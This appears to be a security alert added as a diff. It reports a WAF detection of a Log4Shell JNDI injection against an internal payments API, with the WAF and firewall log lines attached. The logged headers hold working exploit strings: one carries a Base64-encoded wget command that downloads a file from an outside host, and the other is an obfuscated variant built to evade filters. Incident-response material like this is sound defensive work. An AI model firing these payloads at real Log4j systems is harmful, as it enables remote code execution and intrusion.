@@ -1,0 +1,11 @@
+ALERT: WAF signature match "Java JNDI injection attempt" (rule 944150) - possible CVE-2021-44228
+Source: ModSecurity on edge-waf-01 (mode: DETECT ONLY, not blocking)
+Target: payments-api.internal (10.20.4.15), Apache Tomcat 9 / Java 11, app uses Apache Log4j 2.14.1
+
+--- WAF log ---
+2026-10-17T03:12:44Z 198.51.100.23 -> 10.20.4.15:8443 GET /api/v2/invoices?id=1 HTTP/1.1 User-Agent: ${jndi:ldap://203.0.113.45:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMjAzLjAuMTEzLjQ1L3gubg==} status=200
+2026-10-17T03:12:47Z 198.51.100.23 -> 10.20.4.15:8443 GET /api/v2/login HTTP/1.1 X-Api-Version: ${${lower:j}ndi:${lower:l}dap://203.0.113.45:1389/a} status=401
+
+--- Firewall log (core-fw-02) ---
+2026-10-17T03:12:45Z ALLOW TCP 10.20.4.15:51822 -> 203.0.113.45:1389 bytes_out=412 bytes_in=3188 app=ldap
+2026-10-17T03:12:46Z ALLOW TCP 10.20.4.15:51830 -> 203.0.113.45:80 bytes_out=210 bytes_in=48211 app=web-browsing url=http://203.0.113.45/x.n
